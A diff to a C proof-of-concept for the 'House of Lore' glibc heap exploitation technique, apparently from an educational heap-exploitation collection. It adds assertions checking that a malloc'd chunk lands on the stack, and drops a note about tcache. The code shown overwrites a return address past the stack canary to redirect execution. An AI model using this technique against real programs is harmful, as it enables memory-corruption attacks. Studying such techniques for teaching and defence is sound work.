@@ -25,6 +25,7 @@ else
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
+#include <assert.h>
 
 void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }
 
@@ -37,7 +38,6 @@ int main(int argc, char * argv[]){
   fprintf(stderr, "\nWelcome to the House of Lore\n");
   fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
   fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");
-  fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
 
   fprintf(stderr, "Allocating the victim chunk\n");
   intptr_t *victim = malloc(100);
@@ -109,4 +109,8 @@ int main(int argc, char * argv[]){
   fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
   memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
+
+  // sanity check
+  assert((long)stack_buffer_1 - 0x100 < (long)p4);
+  assert((long)stack_buffer_1 + 0x100 > (long)p4);
 }
